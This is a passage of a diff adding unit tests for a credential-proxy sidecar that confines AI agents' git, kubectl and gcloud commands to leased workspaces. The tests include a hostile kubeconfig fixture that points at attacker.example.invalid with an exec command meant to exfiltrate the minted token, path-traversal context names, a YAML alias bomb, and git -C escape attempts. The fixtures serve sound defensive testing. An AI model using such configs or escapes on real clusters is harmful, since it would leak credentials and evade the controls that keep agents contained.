@@ -1,26 +1,35 @@
 import json
+import os
 import queue
 import socket
 import subprocess
 import sys
 import tempfile
+import textwrap
 import threading
 import types
 import unittest
 import urllib.error
 import urllib.request
+from http import HTTPStatus
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
 from unittest import mock
 
+import credential_proxy
 from credential_proxy import (
     MAX_REPOSITORY_LENGTH,
     AgentAPIProxyHandler,
     CommandExecutor,
+    CredentialProxyHandler,
     GoogleChatRelay,
     Policy,
     SlackRelay,
+    _slack_error_detail,
+    _slack_error_fields,
     is_valid_repository,
+    parse_gke_context,
+    read_current_context,
 )
 from slack_relay_patch import read_upload
 
@@ -195,19 +204,391 @@ class PolicyTest(unittest.TestCase):
         self.assertIsNone(self.policy.blocked_by(["kubectl", "get", "pods"]))
 
 
+class GitLeaseGateTest(unittest.TestCase):
+    """The floor under the shared PersistentVolumeClaim.
+
+    Containment to the workspace keeps agents off the sidecar's filesystem; it
+    says nothing about keeping them off each other. `submit-suggestion` ran
+    `checkout -b` and `push -f` inside a clone a fleet audit was midway through,
+    because the clone was a single directory every agent shared. Skills now take
+    a lease and get a private tree under it, and this is what stops a skill that
+    does not from mutating one anyway.
+    """
+
+    def setUp(self):
+        self.temp_dir = tempfile.TemporaryDirectory()
+        self.addCleanup(self.temp_dir.cleanup)
+
+    def executor(self, **environment):
+        with mock.patch.dict(os.environ, environment):
+            return CommandExecutor(
+                timeout_seconds=5, max_output_bytes=1024, state_dir=self.temp_dir.name
+            )
+
+    def leased(self, executor, lease="compliance-audit", repo="acme__fleet"):
+        """A workspace laid out the way `gitops_workspace` lays one out."""
+        holder = executor.workspace_dir / "gitops" / lease
+        workspace = holder / repo
+        workspace.mkdir(parents=True, exist_ok=True)
+        (holder / ".lease").write_text(
+            json.dumps({"lease": lease, "owner": "fleet-audit"}), encoding="utf-8"
+        )
+        return workspace
+
+    def test_a_mutating_verb_inside_a_lease_is_allowed(self):
+        executor = self.executor()
+        workspace = self.leased(executor)
+        for argv in (
+            ["git", "commit", "-m", "remediate netpol"],
+            ["git", "add", "clusters/prod/netpol.yaml"],
+            ["git", "checkout", "-B", "fleet-audit/compliance", "origin/main"],
+            ["git", "push", "--force-with-lease", "origin", "fleet-audit/compliance"],
+        ):
+            with self.subTest(argv=argv):
+                self.assertIsNone(executor.git_lease_violation(argv, str(workspace)))
+
+    def test_the_verbs_that_write_a_tree_without_saying_so_are_refused(self):
+        # Each of these is a working-tree write under another name: `pull` is
+        # `fetch` plus a merge or a rebase, `submodule update` checks out whole
+        # directories, `sparse-checkout set` adds and removes files across the
+        # entire tree. All three used to be reachable in a clone another agent
+        # was midway through, because the denylist only named the obvious verbs.
+        executor = self.executor()
+        self.leased(executor)
+        unleased = str(executor.workspace_dir)
+        for argv in (
+            ["git", "pull", "--rebase", "origin", "main"],
+            ["git", "submodule", "update", "--init", "--recursive"],
+            ["git", "sparse-checkout", "set", "clusters/prod"],
+        ):
+            with self.subTest(argv=argv):
+                self.assertIsNotNone(executor.git_lease_violation(argv, unleased))
+
+    def test_a_subdirectory_of_the_lease_is_still_inside_it(self):
+        # The agent `cd`s into the manifests it is editing.
+        executor = self.executor()
+        workspace = self.leased(executor)
+        nested = workspace / "clusters" / "prod"
+        nested.mkdir(parents=True)
+        self.assertIsNone(
+            executor.git_lease_violation(["git", "commit", "-m", "x"], str(nested))
+        )
+
+    def test_a_mutating_verb_outside_every_lease_is_refused(self):
+        # The incident, reduced: an agent that skipped the workspace step and
+        # ran git wherever its shell happened to be.
+        executor = self.executor()
+        self.leased(executor)
+        violation = executor.git_lease_violation(
+            ["git", "commit", "--allow-empty", "-m", "x"], str(executor.workspace_dir)
+        )
+        self.assertIsNotNone(violation)
+        self.assertIn(".lease", violation)
+        self.assertIn("submit_suggestion.py prepare", violation)
+
+    def test_the_legacy_shared_clone_is_no_longer_writable(self):
+        # `/opt/data/gitops/<owner>__<name>` — the flat directory every agent
+        # used to share. It survives an upgrade on disk; it must not survive as
+        # a place to commit.
+        executor = self.executor()
+        legacy = executor.workspace_dir / "gitops" / "acme__fleet"
+        (legacy / ".git").mkdir(parents=True)
+        self.assertIsNotNone(
+            executor.git_lease_violation(["git", "commit", "-m", "x"], str(legacy))
+        )
+
+    def test_read_verbs_are_untouched(self):
+        # A denylist, not a read-only allowlist: an unfamiliar read verb failing
+        # closed would be a worse outcome than the race this closes.
+        executor = self.executor()
+        unleased = str(executor.workspace_dir)
+        for argv in (
+            ["git", "status"],
+            ["git", "diff", "--stat"],
+            ["git", "log", "-1"],
+            ["git", "show", "HEAD"],
+            ["git", "rev-parse", "--abbrev-ref", "HEAD"],
+            ["git", "fetch", "--prune", "origin"],
+            ["git", "config", "user.name", "platform-agent"],
+            ["git", "ls-files"],
+        ):
+            with self.subTest(argv=argv):
+                self.assertIsNone(executor.git_lease_violation(argv, unleased))
+
+    def test_clone_is_allowed_at_the_lease_root(self):
+        # `ensure_workspace` runs it one directory above a tree that does not
+        # exist yet, so there is nothing there to damage — and the `.lease` is
+        # written first, so the directory is leased even then.
+        executor = self.executor()
+        holder = executor.workspace_dir / "gitops" / "t_card"
+        holder.mkdir(parents=True)
+        self.assertIsNone(
+            executor.git_lease_violation(
+                ["git", "clone", "--quiet", "https://github.com/acme/fleet", "x"],
+                str(holder),
+            )
+        )
+
+    def test_a_dash_c_redirect_out_of_the_lease_is_refused(self):
+        # git applies `-C` before running the subcommand, so a check that only
+        # read `cwd` would be checking a directory the command never touches.
+        executor = self.executor()
+        workspace = self.leased(executor)
+        escape = executor.workspace_dir / "profiles"
+        escape.mkdir(parents=True, exist_ok=True)
+        for argv in (
+            ["git", "-C", "../../profiles", "commit", "-m", "x"],
+            ["git", "-C", str(escape), "checkout", "main"],
+            ["git", "-C=../..", "reset", "--hard"],
+        ):
+            with self.subTest(argv=argv):
+                self.assertIsNotNone(
+                    executor.git_lease_violation(argv, str(workspace))
+                )
+
+    def test_a_dash_c_redirect_into_a_lease_is_allowed(self):
+        executor = self.executor()
+        workspace = self.leased(executor)
+        self.assertIsNone(
+            executor.git_lease_violation(
+                ["git", "-C", str(workspace), "commit", "-m", "x"],
+                str(executor.workspace_dir),
+            )
+        )
+
+    def test_a_global_flag_does_not_hide_the_subcommand(self):
+        # `audit_report.py` issues `git --literal-pathspecs add …`.
+        executor = self.executor()
+        self.assertIsNotNone(
+            executor.git_lease_violation(
+                ["git", "--literal-pathspecs", "add", "manifest.yaml"],
+                str(executor.workspace_dir),
+            )
+        )
+
+    def test_a_flag_value_is_not_mistaken_for_a_verb(self):
+        # `-c` consumes the next argument; reading it as the subcommand would
+        # make the gate skip a real `commit`.
+        executor = self.executor()
+        self.assertIsNotNone(
+            executor.git_lease_violation(
+                ["git", "-c", "commit.gpgsign=false", "commit", "-m", "x"],
+                str(executor.workspace_dir),
+            )
+        )
+
+    def test_a_directory_outside_the_workspace_says_so(self):
+        executor = self.executor()
+        violation = executor.git_lease_violation(["git", "commit", "-m", "x"], "/etc")
+        self.assertIn("outside the shared workspace", violation)
+
+    def test_no_working_directory_at_all_is_refused(self):
+        # The pre-lease `submit_suggestion.py` sent none, and the sidecar's
+        # default is the workspace root, which holds no lease.
+        executor = self.executor()
+        self.assertIsNotNone(
+            executor.git_lease_violation(["git", "push", "-f", "origin", "x"], None)
+        )
+
+    def test_other_executables_are_not_this_gates_business(self):
+        executor = self.executor()
+        for argv in (
+            ["gh", "pr", "create", "--title", "t"],
+            ["kubectl", "apply", "-f", "manifest.yaml"],
+            ["gcloud", "container", "clusters", "list"],
+        ):
+            with self.subTest(argv=argv):
+                self.assertIsNone(
+                    executor.git_lease_violation(argv, str(executor.workspace_dir))
+                )
+
+    def test_the_gate_can_be_switched_off(self):
+        # The rollback an operator reaches for when a skill that has not been
+        # migrated needs to keep working without a new image.
+        for value in ("0", "false", "no", "off", "OFF"):
+            with self.subTest(value=value):
+                executor = self.executor(CREDENTIAL_PROXY_REQUIRE_GIT_LEASE=value)
+                self.assertIsNone(
+                    executor.git_lease_violation(
+                        ["git", "commit", "-m", "x"], str(executor.workspace_dir)
+                    )
+                )
+
+    def test_the_gate_is_on_by_default(self):
+        with mock.patch.dict(os.environ, {}, clear=False):
+            os.environ.pop("CREDENTIAL_PROXY_REQUIRE_GIT_LEASE", None)
+            self.assertTrue(self.executor().require_git_lease)
+
+    def test_the_marker_name_matches_the_one_gitops_workspace_writes(self):
+        # Two constants in two modules that must not drift: renaming one alone
+        # locks every skill out of git.
+        import gitops_workspace
+
+        self.assertEqual(credential_proxy.GIT_LEASE_MARKER, gitops_workspace.LEASE_FILENAME)
+
+
+class GitLeaseGateWiringTest(unittest.TestCase):
+    """The gate as the agent meets it — over HTTP, through /v1/exec."""
+
+    def setUp(self):
+        self.temp_dir = tempfile.TemporaryDirectory()
+        self.addCleanup(self.temp_dir.cleanup)
+        policy_path = Path(self.temp_dir.name) / "policy.json"
+        policy_path.write_text(
+            json.dumps({"blockedMessage": "blocked", "rules": []}), encoding="utf-8"
+        )
+        CredentialProxyHandler.policy = Policy.load(str(policy_path))
+        CredentialProxyHandler.executor = CommandExecutor(
+            timeout_seconds=5,
+            max_output_bytes=4096,
+            state_dir=str(Path(self.temp_dir.name) / "state"),
+        )
+        CredentialProxyHandler.max_request_bytes = 65536
+        self.server = ThreadingHTTPServer(("127.0.0.1", 0), CredentialProxyHandler)
+        threading.Thread(target=self.server.serve_forever, daemon=True).start()
+        self.addCleanup(self.server.server_close)
+        self.addCleanup(self.server.shutdown)
+
+    def post(self, payload):
+        request = urllib.request.Request(
+            f"http://127.0.0.1:{self.server.server_port}/v1/exec",
+            data=json.dumps(payload).encode("utf-8"),
+            headers={"Content-Type": "application/json"},
+            method="POST",
+        )
+        try:
+            with urllib.request.urlopen(request) as response:
+                return response.status, json.loads(response.read())
+        except urllib.error.HTTPError as error:
+            return error.code, json.loads(error.read())
+
+    def test_an_unleased_commit_comes_back_as_a_policy_block(self):
+        # The shim renders `SECURITY_POLICY_BLOCKED` as a refusal the agent can
+        # read and act on, rather than an unexplained proxy failure.
+        workspace = CredentialProxyHandler.executor.workspace_dir
+        status, body = self.post(
+            {"argv": ["git", "commit", "-m", "x"], "cwd": str(workspace)}
+        )
+        self.assertEqual(403, status)
+        self.assertEqual("blocked", body["status"])
+        self.assertEqual("SECURITY_POLICY_BLOCKED", body["code"])
+        self.assertEqual("git.workspace.lease", body["rule"])
+        self.assertIn("audit_report.py start", body["message"])
+
+    def test_a_leased_commit_reaches_the_executor(self):
+        workspace = (
+            CredentialProxyHandler.executor.workspace_dir / "gitops" / "t_card"
+        )
+        (workspace / "acme__fleet").mkdir(parents=True)
+        (workspace / ".lease").write_text('{"lease": "t_card"}', encoding="utf-8")
+        status, body = self.post(
+            {
+                "argv": ["git", "status", "--porcelain"],
+                "cwd": str(workspace / "acme__fleet"),
+            }
+        )
+        # git runs and fails on "not a repository" — what matters is that the
+        # gate let it through rather than answering 403 itself.
+        self.assertEqual(200, status)
+        self.assertEqual("completed", body["status"])
+
+
 class CommandExecutorTest(unittest.TestCase):
+    CONTEXT = "gke_demo-project_us-central1_cluster-a"
+
     def setUp(self):
         self.temp_dir = tempfile.TemporaryDirectory()
 
     def tearDown(self):
         self.temp_dir.cleanup()
 
-    def executor(self, timeout_seconds=5):
+    def executor(self, timeout_seconds=5, max_output_bytes=1024):
         return CommandExecutor(
             timeout_seconds=timeout_seconds,
-            max_output_bytes=1024,
+            max_output_bytes=max_output_bytes,
             state_dir=self.temp_dir.name,
         )
+
+    def caller_kubeconfig(self, executor, name="kubeconfig.yaml", body=None):
+        """A kubeconfig where the agent can reach it — i.e. one to distrust."""
+        path = executor.workspace_dir / name
+        path.parent.mkdir(parents=True, exist_ok=True)
+        if body is None:
+            body = f"apiVersion: v1\nkind: Config\ncurrent-context: {self.CONTEXT}\n"
+        path.write_text(body, encoding="utf-8")
+        return path
+
+    def seed_managed(self, executor, context=None):
+        """Pretend a previous `get-credentials` already warmed the cache."""
+        context = context or self.CONTEXT
+        managed = executor.kubeconfig_dir / f"{context}.yaml"
+        managed.write_text(
+            f"apiVersion: v1\nkind: Config\ncurrent-context: {context}\n", encoding="utf-8"
+        )
+        return managed
+
+    def fake_gcloud(self, executor):
+        """Swap in a gcloud that writes a kubeconfig the way the real one does.
+
+        Only the destination and the context name matter to anything under test,
+        so the generated document is deliberately minimal.
+        """
+        stub = Path(self.temp_dir.name) / "fake-gcloud"
+        stub.write_text(
+            textwrap.dedent(
+                """\
+                #!/bin/bash
+                set -u
+                project=""; location=""; cluster=""
+                for arg in "$@"; do
+                    case "$arg" in
+                        --project=*) project="${arg#--project=}" ;;
+                        --location=*) location="${arg#--location=}" ;;
+                        container|clusters|get-credentials|--*) ;;
+                        *) [ -n "$cluster" ] || cluster="$arg" ;;
+                    esac
+                done
+                ctx="gke_${project}_${location}_${cluster}"
+                printf 'apiVersion: v1\\nkind: Config\\ncurrent-context: %s\\n' "$ctx" \\
+                    > "$KUBECONFIG"
+                """
+            ),
+            encoding="utf-8",
+        )
+        stub.chmod(0o755)
+        executor.executables["gcloud"] = str(stub)
+        return executor
+
+    def fake_git(self, executor):
+        """Swap in a git that reports the environment it was handed.
+
+        The stub has to be called `git`: the executor decides whether a command
+        gets a commit identity from the executable's own name, so a `fake-git`
+        would test nothing. Hence the directory rather than a suffixed filename.
+        """
+        stub_dir = Path(self.temp_dir.name) / "fake-bin"
+        stub_dir.mkdir(parents=True, exist_ok=True)
+        stub = stub_dir / "git"
+        stub.write_text("#!/bin/bash\nenv\n", encoding="utf-8")
+        stub.chmod(0o755)
+        executor.executables["git"] = str(stub)
+        return executor
+
+    def dumped_environment(self, result):
+        """Parse an `env` dump, insisting it arrived whole.
+
+        A truncated dump would make every `assertNotIn` below pass for the wrong
+        reason, so the size check is part of reading it.
+        """
+        self.assertEqual(0, result.exit_code, result.stderr)
+        self.assertFalse(result.truncated, "environment dump was truncated")
+        return dict(
+            line.split("=", 1) for line in result.stdout.splitlines() if "=" in line
+        )
+
+    def git_environment(self, executor, argv=("git", "commit", "-m", "fleet audit")):
+        """The environment a proxied git subprocess actually receives."""
+        return self.dumped_environment(self.fake_git(executor).execute(list(argv)))
 
     def test_rejects_unsupported_executable(self):
         with self.assertRaisesRegex(ValueError, "not supported"):
@@ -220,6 +601,183 @@ class CommandExecutorTest(unittest.TestCase):
     def test_rejects_working_directory_outside_shared_workspace(self):
         with self.assertRaisesRegex(ValueError, "outside the shared workspace"):
             self.executor().execute(["git", "status"], cwd="/")
+
+    def test_kubeconfig_defaults_to_the_sidecar_context(self):
+        # Omitting the field must not disturb the bootstrapped context — the
+        # Platform Agent sends no KUBECONFIG and relies on this default.
+        executor = self.executor()
+        result = executor._execute(["/bin/sh", "-c", 'printf "%s" "$KUBECONFIG"'])
+        self.assertEqual(executor.environment["KUBECONFIG"], result.stdout)
+
+    # ---- The caller's kubeconfig is a name, never content -------------------
+
+    def test_command_runs_against_the_proxy_copy_not_the_callers(self):
+        executor = self.executor()
+        managed = self.seed_managed(executor)
+        pinned = self.caller_kubeconfig(executor, name="profiles/cluster-a/kubeconfig.yaml")
+
+        resolved = executor._resolve_kubeconfig(str(pinned))
+
+        self.assertEqual(managed, resolved)
+        # The whole point: what kubectl opens is somewhere the agent cannot write.
+        self.assertFalse(executor._within_workspace(resolved))
+
+    def test_hostile_kubeconfig_content_never_reaches_the_command(self):
+        # The escape this mechanism exists to close. Every field here is one the
+        # sidecar would otherwise act on: `exec.command` runs next to the
+        # credentials, `server` picks where the minted token is sent, and
+        # `insecure-skip-tls-verify` removes the obstacle to sending it there.
+        # None of it can be seen by the policy engine, whose rules match argv.
+        executor = self.executor()
+        self.seed_managed(executor)
+        hostile = self.caller_kubeconfig(
+            executor,
+            body=(
+                "apiVersion: v1\n"
+                "kind: Config\n"
+                f"current-context: {self.CONTEXT}\n"
+                "clusters:\n"
+                f"- name: {self.CONTEXT}\n"
+                "  cluster:\n"
+                "    server: https://attacker.example.invalid\n"
+                "    insecure-skip-tls-verify: true\n"
+                "users:\n"
+                f"- name: {self.CONTEXT}\n"
+                "  user:\n"
+                "    exec:\n"
+                "      command: /bin/sh\n"
+                '      args: ["-c", "exfiltrate"]\n'
+            ),
+        )
+
+        resolved = executor._resolve_kubeconfig(str(hostile))
+        contents = resolved.read_text(encoding="utf-8")
+
+        for trace in ("attacker.example.invalid", "/bin/sh", "insecure-skip-tls-verify"):
+            self.assertNotIn(trace, contents)
+
+    def test_kubeconfig_flag_is_rerouted_as_well_as_the_environment(self):
+        # `--kubeconfig` takes precedence over KUBECONFIG in kubectl and reaches
+        # the sidecar untouched — no policy rule mentions it. Rewriting only the
+        # environment would leave the flag as a way straight back to the
+        # caller's own file.
+        executor = self.executor()
+        managed = self.seed_managed(executor)
+        pinned = self.caller_kubeconfig(executor)
+
+        joined = executor._reroute_kubeconfig_flags(["kubectl", f"--kubeconfig={pinned}", "get", "pods"])
+        separate = executor._reroute_kubeconfig_flags(["kubectl", "--kubeconfig", str(pinned), "get", "pods"])
+
+        self.assertEqual(["kubectl", f"--kubeconfig={managed}", "get", "pods"], joined)
+        self.assertEqual(["kubectl", "--kubeconfig", str(managed), "get", "pods"], separate)
+
+    def test_kubeconfig_flag_outside_the_workspace_is_still_refused(self):
+        executor = self.executor()
+        with self.assertRaisesRegex(ValueError, "outside the shared workspace"):
+            executor._reroute_kubeconfig_flags(["kubectl", "--kubeconfig=/etc/kubeconfig.yaml", "get", "pods"])
+
+    def test_kubeconfig_surrounding_whitespace_is_ignored(self):
+        # Profile .env files routinely carry a trailing newline; a path that
+        # only differs by whitespace must still resolve, not silently fail.
+        executor = self.executor()
+        managed = self.seed_managed(executor)
+        pinned = self.caller_kubeconfig(executor)
+        self.assertEqual(managed, executor._resolve_kubeconfig(f"  {pinned}\n"))
+
+    # ---- Failing closed ------------------------------------------------------
+
+    def test_rejects_kubeconfig_naming_no_current_context(self):
+        executor = self.executor()
+        pinned = self.caller_kubeconfig(executor, body="apiVersion: v1\nkind: Config\n")
+        with self.assertRaisesRegex(ValueError, "names no current-context"):
+            executor._resolve_kubeconfig(str(pinned))
+
+    def test_rejects_kubeconfig_whose_context_is_not_a_gke_name(self):
+        # Without a parseable triple there is no cluster to re-fetch, so there is
+        # no way to serve the request without trusting the caller's document.
+        executor = self.executor()
+        pinned = self.caller_kubeconfig(executor, body="current-context: minikube\n")
+        with self.assertRaisesRegex(ValueError, "not a GKE context name"):
+            executor._resolve_kubeconfig(str(pinned))
+
+    def test_rejects_kubeconfig_outside_shared_workspace(self):
+        with self.assertRaisesRegex(ValueError, "outside the shared workspace"):
+            self.executor()._resolve_kubeconfig("/etc/kubeconfig.yaml")
+
+    def test_rejects_kubeconfig_escaping_the_workspace_by_traversal(self):
+        executor = self.executor()
+        escape = str(executor.workspace_dir / ".." / "home" / ".kube" / "config")
+        with self.assertRaisesRegex(ValueError, "outside the shared workspace"):
+            executor._resolve_kubeconfig(escape)
+
+    def test_rejects_merged_kubeconfig_lists(self):
+        # kubectl would flatten these into one view; there is no meaningful way
+        # to regenerate a merge of documents that are never trusted.
+        executor = self.executor()
+        allowed = self.caller_kubeconfig(executor)
+        with self.assertRaisesRegex(ValueError, "single file"):
+            executor._resolve_kubeconfig(f"{allowed}:/etc/kubeconfig.yaml")
+
+    def test_rejects_an_implausibly_large_kubeconfig(self):
+        executor = self.executor()
+        pinned = self.caller_kubeconfig(executor, body="#" * (1 << 20) + "\n")
+        with self.assertRaisesRegex(ValueError, "implausibly large"):
+            executor._resolve_kubeconfig(str(pinned))
+
+    # ---- Fetching, and the visible pin --------------------------------------
+
+    def test_cache_miss_refetches_credentials_from_gcloud(self):
+        executor = self.fake_gcloud(self.executor())
+        pinned = self.caller_kubeconfig(executor)
+
+        resolved = executor._resolve_kubeconfig(str(pinned))
+
+        self.assertEqual(executor.kubeconfig_dir / f"{self.CONTEXT}.yaml", resolved)
+        self.assertIn(self.CONTEXT, resolved.read_text(encoding="utf-8"))
+        # Nothing is left behind from the fetch.
+        self.assertEqual([resolved.name], sorted(p.name for p in executor.kubeconfig_dir.iterdir()))
+
+    def test_get_credentials_writes_both_the_managed_copy_and_the_visible_pin(self):
+        # cluster_agent_profile.py and switch_kube_context both reach a cluster
+        # by running this first, so it is what warms the cache. The workspace
+        # copy has to appear too: the profile records that path and the Cluster
+        # Agent preflight stats it.
+        executor = self.fake_gcloud(self.executor())
+        destination = executor.workspace_dir / "profiles" / "cluster-a" / "kubeconfig.yaml"
+
+        result = executor.execute(
+            ["gcloud", "container", "clusters", "get-credentials", "cluster-a",
+             "--location=us-central1", "--project=demo-project"],
+            kubeconfig=str(destination),
+        )
+
+        self.assertEqual(0, result.exit_code)
+        self.assertIn(self.CONTEXT, destination.read_text(encoding="utf-8"))
+        managed = executor.kubeconfig_dir / f"{self.CONTEXT}.yaml"
+        self.assertIn(self.CONTEXT, managed.read_text(encoding="utf-8"))
+
+    def test_get_credentials_never_writes_through_the_callers_path(self):
+        # gcloud must not be handed the agent-writable path directly; if it were,
+        # the agent could swap the file between the write and the read that files
+        # it in the cache.
+        executor = self.fake_gcloud(self.executor())
+        destination = executor.workspace_dir / "kubeconfig.yaml"
+        seen = []
+        original = executor._execute
+
+        def record(argv, **kwargs):
+            seen.append(kwargs.get("kubeconfig_path"))
+            return original(argv, **kwargs)
+
+        with mock.patch.object(executor, "_execute", record):
+            executor.execute(
+                ["gcloud", "container", "clusters", "get-credentials", "cluster-a",
+                 "--location=us-central1", "--project=demo-project"],
+                kubeconfig=str(destination),
+            )
+
+        self.assertEqual(1, len(seen))
+        self.assertFalse(executor._within_workspace(seen[0]))
 
     def test_timeout_kills_command(self):
         result = self.executor(timeout_seconds=1).execute_internal(["/bin/sleep", "10"])
@@ -255,6 +813,74 @@ class CommandExecutorTest(unittest.TestCase):
         self.assertNotIn("SLACK_BOT_TOKEN", executor.environment)
         self.assertEqual(str(Path(self.temp_dir.name) / "home"), executor.environment["HOME"])
 
+    def test_git_commands_carry_a_commit_identity(self):
+        # The remediation Pull Request path commits through the proxy, and the
+        # commit runs here, in the sidecar. With no identity `git commit` exits
+        # 128 before it writes anything, so all four variables have to be set.
+        environment = self.git_environment(self.executor(max_output_bytes=1 << 16))
+        self.assertEqual("kube-agents platform agent", environment["GIT_AUTHOR_NAME"])
+        self.assertEqual("kube-agents platform agent", environment["GIT_COMMITTER_NAME"])
+        self.assertEqual("platform-agent@kube-agents.invalid", environment["GIT_AUTHOR_EMAIL"])
+        self.assertEqual("platform-agent@kube-agents.invalid", environment["GIT_COMMITTER_EMAIL"])
+
+    def test_commit_identity_honours_the_operator_override(self):
+        import os
+
+        overrides = {
+            "CREDENTIAL_PROXY_GIT_AUTHOR_NAME": "fleet-bot",
+            "CREDENTIAL_PROXY_GIT_AUTHOR_EMAIL": "fleet-bot@example.invalid",
+        }
+        previous = {name: os.environ.get(name) for name in overrides}
+        os.environ.update(overrides)
+        try:
+            executor = self.executor(max_output_bytes=1 << 16)
+        finally:
+            for name, value in previous.items():
+                if value is None:
+                    del os.environ[name]
+                else:
+                    os.environ[name] = value
+        environment = self.git_environment(executor)
+        self.assertEqual("fleet-bot", environment["GIT_AUTHOR_NAME"])
+        self.assertEqual("fleet-bot", environment["GIT_COMMITTER_NAME"])
+        self.assertEqual("fleet-bot@example.invalid", environment["GIT_AUTHOR_EMAIL"])
+        self.assertEqual("fleet-bot@example.invalid", environment["GIT_COMMITTER_EMAIL"])
+
+    def test_commit_identity_reaches_no_other_executable(self):
+        # Scoped to git on purpose: nothing else needs it, and a variable that is
+        # not there cannot be read by a command that had no business seeing it.
+        executor = self.executor(max_output_bytes=1 << 16)
+        environment = self.dumped_environment(
+            executor.execute_internal(["/bin/bash", "-c", "env"])
+        )
+        for name in ("GIT_AUTHOR_NAME", "GIT_AUTHOR_EMAIL", "GIT_COMMITTER_NAME", "GIT_COMMITTER_EMAIL"):
+            self.assertNotIn(name, environment)
+
+    def test_commit_identity_forwards_no_token(self):
+        # The identity is the only thing git gains. Its credentials still come
+        # from the sidecar's own store, so no bearer token may ride along.
+        import os
+
+        tokens = {
+            "GITHUB_TOKEN": "must-not-be-forwarded-github",
+            "GH_TOKEN": "must-not-be-forwarded-gh",
+            "SLACK_BOT_TOKEN": "must-not-be-forwarded-slack",
+        }
+        previous = {name: os.environ.get(name) for name in tokens}
+        os.environ.update(tokens)
+        try:
+            executor = self.executor(max_output_bytes=1 << 16)
+        finally:
+            for name, value in previous.items():
+                if value is None:
+                    del os.environ[name]
+                else:
+                    os.environ[name] = value
+        environment = self.git_environment(executor)
+        for name, value in tokens.items():
+            self.assertNotIn(name, environment)
+            self.assertNotIn(value, environment.values())
+
     def test_bootstrap_prepares_profile_for_later_commands(self):
         import os
 
@@ -281,6 +907,119 @@ class CommandExecutorTest(unittest.TestCase):
         with self.assertRaisesRegex(RuntimeError, "exit code 9") as raised:
             self.executor().bootstrap("printf secret >&2; exit 9")
         self.assertNotIn("secret", str(raised.exception))
+
+    def test_bootstrap_failure_logs_command_output(self):
+        # The exception stays output-free, but an operator reading the sidecar's
+        # own logs needs to see why the bootstrap failed.
+        with self.assertLogs("credential-proxy", level="ERROR") as captured:
+            with self.assertRaisesRegex(RuntimeError, "exit code 9"):
+                self.executor().bootstrap(
+                    "printf came-from-stdout; printf came-from-stderr >&2; exit 9"
+                )
+        logged = "\n".join(captured.output)
+        self.assertIn("came-from-stdout", logged)
+        self.assertIn("came-from-stderr", logged)
+        self.assertIn("exit code 9", logged)
+
+
+class GkeContextTest(unittest.TestCase):
+    """`parse_gke_context` is the whole trust boundary for kubeconfig content.
+
+    Everything downstream — which cluster gets re-fetched, and the filename the
+    result is cached under — comes from what this returns, so anything it lets
+    through has to be a real GKE triple and nothing else.
+    """
+
+    def test_recovers_the_triple(self):
+        target = parse_gke_context("gke_demo-project_us-central1-a_cluster-a")
+        self.assertEqual(("demo-project", "us-central1-a", "cluster-a"),
+                         (target.project, target.location, target.cluster))
+
+    def test_round_trips_the_context_name(self):
+        # The proxy, the operator's buildCredentialProxyEnv, and the preflight all
+        # spell this the same way; the cache filename depends on it.
+        name = "gke_demo-project_us-central1_cluster-a"
+        self.assertEqual(name, parse_gke_context(name).context_name)
+
+    def test_rejects_names_that_are_not_gke_contexts(self):
+        for context in ("minikube", "gke_only_three", "arn:aws:eks:us-east-1:1:cluster/x", ""):
+            with self.subTest(context=context):
+                self.assertIsNone(parse_gke_context(context))
+
+    def test_rejects_components_that_would_escape_the_cache_directory(self):
+        # The parsed values become a filename, so traversal and separators must
+        # not survive the parse.
+        for context in (
+            "gke_..__.._etc",
+            "gke_proj_loc_../../escape",
+            "gke_proj_loc_has/slash",
+            "gke_proj_loc_-leading-dash",
+            "gke_proj_loc_Upper",
+            "gke_proj_loc_has space",
+        ):
+            with self.subTest(context=context):
+                self.assertIsNone(parse_gke_context(context))
+
+
+class CurrentContextTest(unittest.TestCase):
+    def test_reads_a_plain_value(self):
+        self.assertEqual("gke_p_l_c", read_current_context("current-context: gke_p_l_c\n"))
+
+    def test_reads_quoted_and_commented_forms(self):
+        # gcloud has emitted both over time.
+        self.assertEqual("gke_p_l_c", read_current_context('current-context: "gke_p_l_c"\n'))
+        self.assertEqual("gke_p_l_c", read_current_context("current-context: 'gke_p_l_c'\n"))
+        self.assertEqual("gke_p_l_c", read_current_context("current-context: gke_p_l_c # pinned\n"))
+
+    def test_reads_the_spellings_only_a_real_parser_sees(self):
+        # YAML is a JSON superset and a kubeconfig may legally use any of these.
+        # A line scanner reads the block scalar's `>-` as the value and misses
+        # the rest outright, which turns a valid pin into a rejected request.
+        for label, document in (
+            ("json", '{"current-context": "gke_p_l_c", "kind": "Config"}'),
+            ("flow mapping", "{current-context: gke_p_l_c}"),
+            ("block scalar", "current-context: >-\n  gke_p_l_c\n"),
+            ("merge key", "base: &b {current-context: gke_p_l_c}\n<<: *b\n"),
+        ):
+            with self.subTest(label):
+                self.assertEqual("gke_p_l_c", read_current_context(document))
+
+    def test_reads_the_top_level_key_not_a_nested_one(self):
+        document = (
+            "contexts:\n"
+            "- context:\n"
+            "    current-context: gke_decoy_l_c\n"
+            "current-context: gke_real_l_c\n"
+        )
+        self.assertEqual("gke_real_l_c", read_current_context(document))
+
+    def test_returns_none_when_there_is_nothing_to_read(self):
+        for label, document in (
+            ("no such key", "apiVersion: v1\n"),
+            ("null value", "current-context:\n"),
+            ("empty value", "current-context: '' \n"),
+            ("non-string value", "current-context: 17\n"),
+            ("not a mapping", "- current-context: gke_p_l_c\n"),
+            ("empty document", ""),
+            ("syntax error", "current-context: [unterminated\n"),
+            ("several documents", "current-context: gke_a_l_c\n---\ncurrent-context: gke_b_l_c\n"),
+        ):
+            with self.subTest(label):
+                self.assertIsNone(read_current_context(document))
+
+    def test_survives_a_document_built_to_kill_the_parser(self):
+        # Both shapes are reachable: the caller's kubeconfig is agent-authored
+        # and only bounded by MAX_KUBECONFIG_BYTES. Deep nesting is why the
+        # loader must stay pure-Python — under yaml.CSafeLoader this segfaults
+        # the sidecar rather than raising.
+        self.assertIsNone(read_current_context("[" * 200_000 + "]" * 200_000))
+
+        bomb = 'a: &a ["x","x","x","x","x","x","x","x","x"]\n'
+        for index in range(1, 12):
+            parent, child = chr(ord("a") + index), chr(ord("a") + index - 1)
+            bomb += f"{parent}: &{parent} [" + ",".join([f"*{child}"] * 9) + "]\n"
+        bomb += "current-context: gke_p_l_c\n"
+        self.assertEqual("gke_p_l_c", read_current_context(bomb))
 
 
 class RepositoryValidationTest(unittest.TestCase):
@@ -349,11 +1088,29 @@ class GoogleChatRelayTest(unittest.TestCase):
 
 
 class SlackRelayTest(unittest.TestCase):
+    class FakeResponse:
